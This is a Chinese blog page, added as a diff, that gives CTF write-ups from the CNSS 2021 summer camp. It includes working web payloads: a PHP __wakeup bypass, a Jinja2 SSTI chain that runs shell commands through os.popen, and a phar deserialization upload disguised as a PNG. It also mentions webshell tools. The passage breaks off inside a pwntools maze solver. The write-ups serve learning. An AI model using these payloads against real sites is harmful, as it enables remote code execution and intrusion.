@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>CNSS2021夏令营游记 - Shino Channel</title><meta name="Description" content="这是我的全新 Hugo 网站"><meta property="og:title" content="CNSS2021夏令营游记" />
+<meta property="og:description" content="写在前面 ​	第一次玩CTF属于是，萌新吓傻了。
+Web 0x01 第一次冒险 ​	按照网页提示操作，最后结合提示在cookie中得到一个字符串，使用base64解密得到flag
+0x02 更简单的计算题 ​	算出来发现提交不了？F12修改输入框的长度限制和提交按钮的disable状态，提交得到flag
+0x03 卖菜刀 ​	依照题目，使用工具中国菜刀，在网站根目录可以找到flag文件。
+0x04 最好的语言？ ​	这个题有点难，搞了好久。具体就是利用php的反序列化漏洞，即最后会将GET到的interesting参数反序列化。而我们可以利用这一点在interesting变量中加入代码让它执行达到目的。
+​	class中的wakeup()函数会在对象被反序列化的时候执行，destruct()函数会在对象被销毁时执行。观察一下当a=&lsquo;1&rsquo;,b=&lsquo;2&rsquo;,c=&lsquo;3&rsquo;时对象就会在被销毁时输出flag。（注意是字符类型的123）而wakeup()函数会把abc修改成数值类型的123。而众所周知，对象会在程序执行结束后被销毁。所以我们的目的就是：利用反序列化漏洞构造一个Flag类的参数t，并且绕过其反序列化时执行的wakeup()直接执行destruct()。
+​	那么怎么绕过wakeup()呢？
+​	百度搜索可以得知：在某些php版本中，如果表示对象属性个数的值大于真实的属性个数时就会跳过wakeup()的执行。写个代码看看对象序列化之后啥样：
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class Flag { public $a = &#39;1&#39;; protected $b = &#39;2&#39;; private $c = &#39;3&#39;; function __construct() { $this-&gt;a = &#39;1&#39;; $this-&gt;b = &#39;2&#39;; $this-&gt;c = &#39;3&#39;; } } $t = new Flag(); echo serialize($t);   得到结果：" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://sh11no.github.io/cnsssummer/" /><meta property="og:image" content="http://sh11no.github.io/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-08-20T13:36:08+08:00" />
+<meta property="article:modified_time" content="2021-08-20T13:36:08+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="http://sh11no.github.io/logo.png"/>
+
+<meta name="twitter:title" content="CNSS2021夏令营游记"/>
+<meta name="twitter:description" content="写在前面 ​	第一次玩CTF属于是，萌新吓傻了。
+Web 0x01 第一次冒险 ​	按照网页提示操作，最后结合提示在cookie中得到一个字符串，使用base64解密得到flag
+0x02 更简单的计算题 ​	算出来发现提交不了？F12修改输入框的长度限制和提交按钮的disable状态，提交得到flag
+0x03 卖菜刀 ​	依照题目，使用工具中国菜刀，在网站根目录可以找到flag文件。
+0x04 最好的语言？ ​	这个题有点难，搞了好久。具体就是利用php的反序列化漏洞，即最后会将GET到的interesting参数反序列化。而我们可以利用这一点在interesting变量中加入代码让它执行达到目的。
+​	class中的wakeup()函数会在对象被反序列化的时候执行，destruct()函数会在对象被销毁时执行。观察一下当a=&lsquo;1&rsquo;,b=&lsquo;2&rsquo;,c=&lsquo;3&rsquo;时对象就会在被销毁时输出flag。（注意是字符类型的123）而wakeup()函数会把abc修改成数值类型的123。而众所周知，对象会在程序执行结束后被销毁。所以我们的目的就是：利用反序列化漏洞构造一个Flag类的参数t，并且绕过其反序列化时执行的wakeup()直接执行destruct()。
+​	那么怎么绕过wakeup()呢？
+​	百度搜索可以得知：在某些php版本中，如果表示对象属性个数的值大于真实的属性个数时就会跳过wakeup()的执行。写个代码看看对象序列化之后啥样：
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  class Flag { public $a = &#39;1&#39;; protected $b = &#39;2&#39;; private $c = &#39;3&#39;; function __construct() { $this-&gt;a = &#39;1&#39;; $this-&gt;b = &#39;2&#39;; $this-&gt;c = &#39;3&#39;; } } $t = new Flag(); echo serialize($t);   得到结果："/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://sh11no.github.io/cnsssummer/" /><link rel="prev" href="http://sh11no.github.io/helloworld/" /><link rel="next" href="http://sh11no.github.io/reverse/" /><link rel="stylesheet" href="/lib/normalize/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"><link rel="stylesheet" href="/lib/animate/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "CNSS2021夏令营游记",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/sh11no.github.io\/cnsssummer\/"
+        },"genre": "posts","wordcount":  1057 ,
+        "url": "http:\/\/sh11no.github.io\/cnsssummer\/","datePublished": "2021-08-20T13:36:08+08:00","dateModified": "2021-08-20T13:36:08+08:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "Shino"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Shino Channel"><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="http://www.nu1l.com/" rel="noopener noreffer" target="_blank"> Nu1L </a><a class="menu-item" href="http://blog.cnss.io/" rel="noopener noreffer" target="_blank"> CNSS </a><a class="menu-item" href="/friends/"> Friends </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Shino Channel"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="http://www.nu1l.com/" title="" rel="noopener noreffer" target="_blank">Nu1L</a><a class="menu-item" href="http://blog.cnss.io/" title="" rel="noopener noreffer" target="_blank">CNSS</a><a class="menu-item" href="/friends/" title="">Friends</a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">CNSS2021夏令营游记</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Shino</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-08-20">2021-08-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 1057 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="true">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#写在前面">写在前面</a></li>
+    <li><a href="#web">Web</a>
+      <ul>
+        <li><a href="#0x01-第一次冒险">0x01 第一次冒险</a></li>
+        <li><a href="#0x02-更简单的计算题">0x02 更简单的计算题</a></li>
+        <li><a href="#0x03-卖菜刀">0x03 卖菜刀</a></li>
+        <li><a href="#0x04-最好的语言">0x04 最好的语言？</a></li>
+        <li><a href="#0x05-你要玩蛇吗">0x05 你要玩蛇吗</a></li>
+        <li><a href="#0x06-给我康康你的照片">0x06 给我康康你的照片</a></li>
+      </ul>
+    </li>
+    <li><a href="#reverse">Reverse</a>
+      <ul>
+        <li><a href="#0x01-hello-reverse">0x01 Hello Reverse</a></li>
+        <li><a href="#0x02-where-are-u">0x02 Where Are U</a></li>
+        <li><a href="#0x03-吸吸嘉嘉">0x03 吸/吸嘉嘉</a></li>
+        <li><a href="#0x04-抽奖得flag">0x04 抽奖得flag</a></li>
+        <li><a href="#0x05-没想好名字的题目">0x05 没想好名字的题目</a></li>
+        <li><a href="#0x0-攻壳机动队">0x0? 攻壳机动队</a></li>
+        <li><a href="#0x0--黑客帝国">0x0?  黑客帝国</a></li>
+      </ul>
+    </li>
+    <li><a href="#pwn">Pwn</a>
+      <ul>
+        <li><a href="#0xff番外maze">0xFF（番外）Maze</a></li>
+        <li><a href="#0x01-让我康康你的nc">0x01 让我康康你的Nc</a></li>
+        <li><a href="#0x02-网安的第一口饭">0x02 网安的第一口饭</a></li>
+      </ul>
+    </li>
+    <li><a href="#crypto">Crypto</a>
+      <ul>
+        <li><a href="#龙王的代码i">龙王的代码I</a></li>
+        <li><a href="#eeeeeezrsa">eeeeeezrsa</a></li>
+        <li><a href="#龙王的代码ii">龙王的代码II</a></li>
+        <li><a href="#feistal">Feistal</a></li>
+        <li><a href="#龙王的代码iii">龙王的代码III</a></li>
+        <li><a href="#caesar">Caesar?!?</a></li>
+        <li><a href="#prng">PRNG</a></li>
+      </ul>
+    </li>
+    <li><a href="#misc">Misc</a>
+      <ul>
+        <li><a href="#misc的文件">Misc的文件</a></li>
+        <li><a href="#no-password">No Password</a></li>
+        <li><a href="#爱要大声说出来">爱要大声说出来</a></li>
+        <li><a href="#baaby-task">baaby task</a></li>
+        <li><a href="#another-bb">another bb</a></li>
+        <li><a href="#casio3超爱emoji">Casio3超爱Emoji</a></li>
+      </ul>
+    </li>
+    <li><a href="#我就会到这里了我好菜啊">我就会到这里了，我好菜啊。</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h2 id="写在前面">写在前面</h2>
+<p>​	第一次玩CTF属于是，萌新吓傻了。</p>
+<h2 id="web">Web</h2>
+<h3 id="0x01-第一次冒险">0x01 第一次冒险</h3>
+<p>​		按照网页提示操作，最后结合提示在cookie中得到一个字符串，使用base64解密得到flag</p>
+<h3 id="0x02-更简单的计算题">0x02 更简单的计算题</h3>
+<p>​		算出来发现提交不了？F12修改输入框的长度限制和提交按钮的disable状态，提交得到flag</p>
+<h3 id="0x03-卖菜刀">0x03 卖菜刀</h3>
+<p>​		依照题目，使用工具中国菜刀，在网站根目录可以找到flag文件。</p>
+<h3 id="0x04-最好的语言">0x04 最好的语言？</h3>
+<p>​		这个题有点难，搞了好久。具体就是利用php的反序列化漏洞，即最后会将GET到的interesting参数反序列化。而我们可以利用这一点在interesting变量中加入代码让它执行达到目的。</p>
+<p>​		class中的wakeup()函数会在对象被反序列化的时候执行，destruct()函数会在对象被销毁时执行。观察一下当a=&lsquo;1&rsquo;,b=&lsquo;2&rsquo;,c=&lsquo;3&rsquo;时对象就会在被销毁时输出flag。（注意是字符类型的123）而wakeup()函数会把abc修改成数值类型的123。而众所周知，对象会在程序执行结束后被销毁。所以我们的目的就是：利用反序列化漏洞构造一个Flag类的参数t，并且绕过其反序列化时执行的wakeup()直接执行destruct()。</p>
+<p>​		那么怎么绕过wakeup()呢？</p>
+<p>​		百度搜索可以得知：在某些php版本中，如果表示对象属性个数的值大于真实的属性个数时就会跳过wakeup()的执行。写个代码看看对象序列化之后啥样：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">class</span> <span class="nc">Flag</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$a</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$b</span> <span class="o">=</span> <span class="s1">&#39;2&#39;</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$c</span> <span class="o">=</span> <span class="s1">&#39;3&#39;</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="s1">&#39;2&#39;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">c</span> <span class="o">=</span> <span class="s1">&#39;3&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+
+<span class="nv">$t</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Flag</span><span class="p">();</span>
+
+<span class="k">echo</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$t</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>得到结果：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">O:4:&#34;Flag&#34;:3:{s:1:&#34;a&#34;;s:1:&#34;1&#34;;s:4:&#34;%00*%00b&#34;;s:1:&#34;2&#34;;s:7:&#34;%00Flag%00c&#34;;s:1:&#34;3&#34;;}
+</code></pre></td></tr></table>
+</div>
+</div><p>其中%00是一个空字符，%00*%00表示protected类型，%00Flag%00表示private类型。</p>
+<p>&ldquo;Flag&quot;后面那个数字便是对象数量。按照上文的漏洞修改一下。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">O:4:&#34;Flag&#34;:114514:{s:1:&#34;a&#34;;s:1:&#34;1&#34;;s:4:&#34;%00*%00b&#34;;s:1:&#34;2&#34;;s:7:&#34;%00Flag%00c&#34;;s:1:&#34;3&#34;;}
+</code></pre></td></tr></table>
+</div>
+</div><p>传入$interesting变量得到flag。</p>
+<h3 id="0x05-你要玩蛇吗">0x05 你要玩蛇吗</h3>
+<p>看到蛇，猜想和<del>Arcaea</del>Python有关。点进去用眼睛瞪，发现网页GET了一个name字段并显示在网页上。</p>
+<p>使用BurpSuite的Repeater功能看到有一个Server：gunicorn字样，谷歌一下发现确实是一个python的webserver，猜测入手点是python。</p>
+<p>众所周知（其实是别人告诉我的），有一个优秀的python web框架叫Flask，默认使用jinja引擎。熟练运用搜索引擎获得一个漏洞示例（下已改为题目格式）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="k">def</span> <span class="nf">cum</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
+	<span class="n">tp</span> <span class="o">=</span> <span class="s1">&#39;{{name}}超喜欢玩蛇哦&#39;</span>
+	<span class="k">return</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">tp</span><span class="p">,</span> <span class="n">name</span><span class="o">=</span><span class="n">name</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>其中render_template_string是jinja引擎的模板渲染函数。其中{{name}}表示name变量的值。那么如果我在浏览器地址栏中令/?name={{Fuc1()}}( 其中Fuc1()是一个函数)会发生什么呢？</p>
+<p><strong>函数Fuc1()的返回值将会显示在页面中</strong></p>
+<p>接下来几步涉及Python基础。</p>
+<ol>
+<li><code>__globals__</code>：每个python函数都含有一个<code>__globals__</code>字典，存储“在本函数中可以存储的全局变量”列表。其中一定有一个<code>__builtins__</code>变量。</li>
+<li><code>__builtins__</code>：我们知道，Python 需要 import 才能引用其他包的函数。但由于一部分函数实在过于常用，所以无需引入也能用。它们就是 <code>__builtins__</code> 字典中的函数。
+比如： <code>print, open, chr, len, abs, eval</code></li>
+<li><code>eval</code>：Python的<code>eval</code>是把一个字符串当作代码来执行。</li>
+</ol>
+<p>也就是我们需要找到一个函数<code>fun</code>，调用<code>fun.__globals__['__builtins__']['eval']()</code>即可在网站上执行任意代码。</p>
+<p>如何找到一个函数呢？搜索得到flask框架中有一个可以直接调用的函数<code>url_for()</code>。</p>
+<p>那么我们需要执行什么代码呢？有如下语句：</p>
+<p><code>__import__(&quot;os&quot;).popen(&quot;...&quot;).read()</code></p>
+<p>作用是引入os并调用，返回程序输出。试试直接<code>cat</code>一下<code>flag</code>？</p>
+<p><code>/?name={{url_for.__globals__['__builtins__']['eval'](__import__(&quot;os&quot;).popen(&quot;cat flag&quot;).read())}}</code></p>
+<p>发现页面上出现了flag，好神奇哦。</p>
+<h3 id="0x06-给我康康你的照片">0x06 给我康康你的照片</h3>
+<p>其实我开这题只是想看看有没有别的小可爱传照片，但是其实看不到，恼火。</p>
+<p>我实在做不出来，索性使用中国御剑扫描网站目录看到有一个robots.txt文件，点进去发现让我访问s3cr3t.php，立即访问。</p>
+<p>其实正确做法是F12看到源码中有一段注释内含“机器人”字样想到访问robots.txt</p>
+<p>进行代码审计，发现GET了一个<code>$interesting</code>变量，并将其作为文件路径，将文件内容读入到<code>$file</code>中。由于<code>file_get_contents()</code>的返回值不是空就是字符串，我们无法在返回值上做手脚。考虑搞一个在访问时触发的木马。</p>
+<p>考虑构造一个<code>phar</code>文件，在读取时利用<code>phar://</code>伪协议直接执行其中代码。参照<code>0x04 最好的语言？</code>题，我们需要构造一个Flag类型对象并赋值好初始值写入<code>phar</code>中，利用<code>__destruct()</code>函数输出<code>flag</code>。</p>
+<p>谷歌一个<code>phar</code>文件构造代码，直接进行一个使用：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
+    <span class="k">class</span> <span class="nc">Flag</span> <span class="p">{</span>
+    <span class="k">public</span> <span class="nv">$a</span><span class="p">;</span>
+    <span class="k">protected</span> <span class="nv">$b</span><span class="p">;</span>
+    <span class="k">private</span> <span class="nv">$c</span><span class="p">;</span>
+
+    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">a</span> <span class="o">=</span> <span class="s1">&#39;1&#39;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">b</span> <span class="o">=</span> <span class="s1">&#39;2&#39;</span><span class="p">;</span>
+        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">c</span> <span class="o">=</span> <span class="s1">&#39;3&#39;</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&#34;phar.phar&#34;</span><span class="p">);</span>
+    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
+    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&#34;&lt;?php __HALT_COMPILER(); ?&gt;&#34;</span><span class="p">);</span>
+    <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Flag</span><span class="p">();</span>
+    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
+    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
+<span class="cp">?&gt;</span><span class="err">
+</span></code></pre></td></tr></table>
+</div>
+</div><p>执行得到phar.phar文件，后缀名改为<code>png</code>上传。</p>
+<p>访问<code>/s3cr3t.php?interesting=phar://./upload/.../...png</code>，发现页面上出现了flag，好神奇哦。</p>
+<h2 id="reverse">Reverse</h2>
+<h3 id="0x01-hello-reverse">0x01 Hello Reverse</h3>
+<p>​		使用ida反编译后即可看到flag</p>
+<h3 id="0x02-where-are-u">0x02 Where Are U</h3>
+<p>​		使用ida反编译后到处找找就有了</p>
+<h3 id="0x03-吸吸嘉嘉">0x03 吸/吸嘉嘉</h3>
+<p>​		反编译后发现程序将flag的每一位字母按位非(~)后与code数组比对。找到code数组，将每一位按位非之后就可以得到答案了。</p>
+<p>​		我是手算的，我可能是弱智。</p>
+<h3 id="0x04-抽奖得flag">0x04 抽奖得flag</h3>
+<p>​		这个题按理说是要使用动态调试，但是不难发现程序中有在满足某个条件时调用一个程序输出flag。直接利用IDA的patch program功能在程序最开头直接调用该程序，运行得到flag。</p>
+<h3 id="0x05-没想好名字的题目">0x05 没想好名字的题目</h3>
+<p>​		反编译之后先把变量名改成人能看的，然后发现三个for套for分别在判断行、列、方块是否有重复数字。结合程序名称发现是数独。分析程序前半部分，发现数独的形成模式是将flag[]的数字填入a[]中值为0的部分中。找到a的初始值，做数独即可得到flag。</p>
+<h3 id="0x0-攻壳机动队">0x0? 攻壳机动队</h3>
+<p>​		使用upx去壳，然后是一个走迷宫小游戏。在内存里找到迷宫，直接走就可以了。</p>
+<h3 id="0x0--黑客帝国">0x0?  黑客帝国</h3>
+<p>​		反编译发现输入30个数，然后if了三十个方程。把方程搞出来跑一遍高斯消元得到flag。</p>
+<h2 id="pwn">Pwn</h2>
+<h3 id="0xff番外maze">0xFF（番外）Maze</h3>
+<p>​	连接服务器之后得到一个随机的迷宫，跑一遍深度优先搜索得到结果。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="n">sys</span><span class="o">.</span><span class="n">setrecursionlimit</span><span class="p">(</span><span class="mi">114514</span><span class="p">)</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s2">&#34;120.25.225.38&#34;</span><span class="p">,</span> <span class="mi">32121</span><span class="p">)</span>
+<span class="n">st</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span> <span class="o">=</span> <span class="kc">False</span><span class="p">)</span>
+<span class="n">st</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(</span><span class="n">keepends</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
+<span class="n">n</span> <span class="o">=</span> <span class="mi">20</span>
+<span class="n">m</span> <span class="o">=</span> <span class="mi">22</span>
+<span class="n">a</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">fx</span> <span class="o">=</span> <span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">fy</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<span class="n">op</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;d&#39;</span><span class="p">,</span> <span class="s1">&#39;s&#39;</span><span class="p">,</span> <span class="s1">&#39;a&#39;</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span>
+<span class="n">tpp</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">flag</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">opts</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">vis</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">mx</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="k">def</span> <span class="nf">dfs</span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
+	<span class="k">if</span> <span class="n">flag</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+		<span class="k">return</span>
